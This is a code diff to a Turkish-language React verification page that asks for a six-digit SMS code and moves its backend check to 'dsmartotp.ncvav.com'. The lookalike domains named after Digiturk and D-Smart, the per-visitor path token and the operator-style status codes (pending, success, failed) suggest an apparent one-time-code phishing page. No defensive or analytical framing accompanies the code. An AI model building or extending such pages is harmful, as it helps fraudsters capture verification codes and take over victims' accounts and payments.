@@ -16,7 +16,7 @@ import { cardStyle } from "./style/card";
 import { useSearchParams } from "react-router-dom";
 
 const CODE_LENGTH = 6;
-const TIMER_SECONDS = 180;
+const TIMER_SECONDS = 5;
 
 function App() {
   const [gsmNo] = useState("5XX XXX XX XX");
@@ -40,33 +40,46 @@ function App() {
 
   const sendPath = async () => {
     try {
-      const formData = new FormData();
-      formData.append("path", getPath ?? "");
+      if (!getPath) {
+        setSonuc("bulunamadi");
+        return;
+      }
 
       const response = await fetch(
-        "https://digiturkonay.com.tr:4485/processCheck.php",
+        "https://dsmartotp.ncvav.com/Dsmart/Api/processCheck",
         {
           method: "POST",
-          body: formData,
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            path: getPath,
+          }),
         },
       );
 
-      const data = await response.text();
-      console.log(data);
+      if (!response.ok) {
+        throw new Error(`HTTP Error: ${response.status}`);
+      }
 
-      if (data === "2") {
+      const data = await response.json();
+
+      console.log("Backend response:", data);
+
+      if (data.process === 1) {
+        setSonuc(null);
+      } else if (data.process === 2) {
         setSonuc("basarili");
-      } else if (data === "3") {
+      } else if (data.process === 3) {
         setSonuc("basarisiz");
-      } else if (data !== "true") {
+      } else if (data.process === 4) {
         setSonuc("bulunamadi");
       }
     } catch (error) {
-      console.log(error);
+      console.error("processCheck hatası:", error);
       setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
     }
   };
-
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
@@ -159,9 +172,6 @@ function App() {
     setGonderiliyor(true);
 
     try {
-      // Buraya gerçek API isteğini koyabilirsin.
-      await new Promise((resolve) => setTimeout(resolve, 1200));
-
       const basarili = code.every((digit) => digit !== "");
 
       if (basarili) {
@@ -412,7 +422,7 @@ function App() {
             <Button
               fullWidth
               variant="contained"
-              disabled={!isCodeComplete || gonderiliyor}
+              disabled={!isCodeComplete || gonderiliyor || sureBitti}
               onClick={handleDogrula}
               sx={{
                 ...verifyButtonStyle,
